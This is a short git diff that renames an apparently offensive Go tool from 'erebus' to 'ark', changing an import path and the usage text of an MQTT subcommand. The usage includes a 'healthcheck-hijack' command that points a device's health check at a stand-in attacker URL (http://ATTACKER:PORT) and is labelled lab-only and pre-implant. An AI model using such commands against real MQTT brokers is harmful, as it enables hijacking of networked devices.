@@ -6,7 +6,7 @@ import (
 	"strconv"
 	"time"
 
-	"github.com/KKingZero/erebus-exploit-framwork/pkg/mqttcli"
+	"github.com/KKingZero/ARK/pkg/mqttcli"
 )
 
 // RunMQTT dispatches: sub | pub | healthcheck-hijack
@@ -29,11 +29,11 @@ func RunMQTT(args []string) error {
 	}
 }
 
-const mqttUsage = `erebus mqtt — operator-local MQTT (no teamserver)
+const mqttUsage = `ark mqtt — operator-local MQTT (no teamserver)
 
-  erebus mqtt sub --host H [--port 1883] [--topic '#'] [--seconds 20]
-  erebus mqtt pub --host H --topic T --payload '…' [--retain] [--qos 0|1]
-  erebus mqtt healthcheck-hijack --host H --topic T --url http://ATTACKER:PORT \
+  ark mqtt sub --host H [--port 1883] [--topic '#'] [--seconds 20]
+  ark mqtt pub --host H --topic T --payload '…' [--retain] [--qos 0|1]
+  ark mqtt healthcheck-hijack --host H --topic T --url http://ATTACKER:PORT \
       [--node node-6] [--ip 172.16.20.10] [--port 1883]
 
 Lab-only. See docs/OPERATOR_PRE_IMPLANT.md
